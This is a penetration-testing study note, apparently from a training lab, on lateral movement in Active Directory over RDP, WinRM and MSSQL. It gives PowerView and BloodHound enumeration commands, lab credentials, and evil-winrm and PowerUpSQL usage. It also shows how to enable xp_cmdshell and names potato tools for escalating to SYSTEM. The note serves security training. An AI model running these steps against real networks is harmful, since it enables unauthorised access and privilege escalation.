# Privileged Access: Lateral Movement in AD

Once you have a foothold in an Active Directory (AD) environment, the next step is to move laterally or escalate privileges. This section covers practical techniques and tools for lateral movement, focusing on:

- Remote Desktop Protocol (RDP)
- PowerShell Remoting (WinRM)
- SQL Server (MSSQL) Admin Access

## Key Enumeration Tools
- **BloodHound**: Visualizes user rights (CanRDP, CanPSRemote, SQLAdmin)
- **PowerView**: Enumerates group memberships and remote access rights

---

## Scenario Setup
- **Windows attack host**: RDP into MS01
- **Linux attack host**: SSH to `172.16.5.225` (`htb-student:HTB_@cademy_stdnt!`)
- Try all methods: Enter-PSSession, PowerUpSQL (Windows); evil-winrm, mssqlclient.py (Linux)

---

## 1. Remote Desktop Protocol (RDP)

- **Goal**: Access hosts via GUI, escalate privileges, or collect sensitive data.
- **Requirement**: User must be in the "Remote Desktop Users" group or have local admin rights.

### Enumerate RDP Access
**PowerView:**
```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```
*Example Output:*
```
MemberName   : INLANEFREIGHT\Domain Users
```
- If "Domain Users" is present, all users can RDP to the host.

**BloodHound:**
- Check for `CanRDP` edges or run built-in queries like "Find Workstations where Domain Users can RDP".

**Testing RDP:**
- Windows: `mstsc.exe`
- Linux: `xfreerdp`, `Remmina`

---

## 2. PowerShell Remoting (WinRM)

- **Goal**: Run commands or get an interactive shell on remote hosts.
- **Requirement**: User must be in the "Remote Management Users" group or have WinRM rights.

### Enumerate WinRM Access
**PowerView:**
```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```
*Example Output:*
```
MemberName   : INLANEFREIGHT\forend
```

**BloodHound Cypher Query:**
```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

### Establishing a WinRM Session
**Windows:**
```powershell
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
```
**Linux:**
- Install: `gem install evil-winrm`
- Connect: `evil-winrm -i <IP> -u <USER>`

---

## 3. SQL Server (MSSQL) Admin Access

- **Goal**: Execute queries or OS commands as the SQL service account (often privileged).
- **Requirement**: User with `sysadmin` rights on SQL Server.

### Enumerate SQL Admin Access
**BloodHound Cypher Query:**
```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

### Using PowerUpSQL (Windows)
```powershell
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```

### Using mssqlclient.py (Linux)
```bash
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```
- Type `help` for available commands (e.g., `enable_xp_cmdshell`, `xp_cmdshell whoami /priv`)

*Example: Enable and use xp_cmdshell:*
```sql
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami /priv
```
- Look for `SeImpersonatePrivilege` (can be used for SYSTEM-level escalation with tools like JuicyPotato, PrintSpoofer, RoguePotato)

---

## Practical Tips
- Always re-enumerate rights after gaining new credentials or host access.
- BloodHound is invaluable for quickly mapping remote access and escalation paths.
- Test SQL credentials found in config files against MSSQL servers—often leads to SYSTEM access.

---

## Summary
- Focus on RDP, WinRM, and SQLAdmin rights for lateral movement.
- Use PowerView and BloodHound for enumeration.
- Use practical tools (evil-winrm, mssqlclient.py, PowerUpSQL) for exploitation.
- Privilege escalation is often possible even without initial local admin rights—enumerate thoroughly!

*Next: Common WinRM connection issues and troubleshooting.* 